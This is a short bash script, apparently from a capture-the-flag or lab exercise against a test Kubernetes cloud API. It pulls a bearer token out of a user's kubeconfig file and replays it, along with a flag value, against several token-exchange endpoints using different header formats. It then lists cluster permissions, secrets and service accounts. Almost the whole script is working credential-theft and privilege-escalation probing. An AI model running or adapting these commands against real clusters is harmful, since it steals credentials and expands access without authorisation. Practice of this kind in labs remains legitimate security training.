set +e
B=https://cloud-api.keplerops.test
JWT=$(python3 -c 'import json;print(json.load(open("/home/rowan/.kube/config"))["users"][0]["user"]["token"])')
echo "JWT len ${#JWT}"
WT='FLAG{6bb66074f2325405}'
probe(){
  label="$1"; shift
  echo "=== $label"
  curl -sSk -m 8 -w '\n[HTTP %{http_code}]\n' "$@" | head -30
}
for tok in "$JWT" "$WT"; do
  tag=JWT; [ "$tok" = "$WT" ] && tag=WT
  probe "$tag POST json workload_token /token-exchange/rowan-workspace" -X POST -H 'Content-Type: application/json' -d "{\"workload_token\":\"$tok\"}" "$B/api/token-exchange/rowan-workspace"
  probe "$tag POST bearer /token-exchange/rowan-workspace" -X POST -H "Authorization: Bearer $tok" -H 'Content-Type: application/json' -d '{}' "$B/api/token-exchange/rowan-workspace"
  probe "$tag POST X-Workload-Token /token-exchange/rowan-workspace" -X POST -H "X-Workload-Token: $tok" -H 'Content-Type: application/json' -d '{}' "$B/api/token-exchange/rowan-workspace"
  probe "$tag POST json token /workspaces/current/token-exchange" -X POST -H 'Content-Type: application/json' -d "{\"token\":\"$tok\"}" "$B/api/workspaces/current/token-exchange"
  probe "$tag POST bearer /workspaces/current/token-exchange" -X POST -H "Authorization: Bearer $tok" -H 'Content-Type: application/json' -d '{}' "$B/api/workspaces/current/token-exchange"
  probe "$tag GET bearer /workspaces/current/token-exchange" -H "Authorization: Bearer $tok" "$B/api/workspaces/current/token-exchange"
done
echo "=== kubectl auth can-i --list"
kubectl auth can-i --list 2>&1 | head -40
echo "=== sa token files in pod? no; kube secrets?"
kubectl get secrets 2>&1 | head
kubectl get serviceaccounts 2>&1 | head
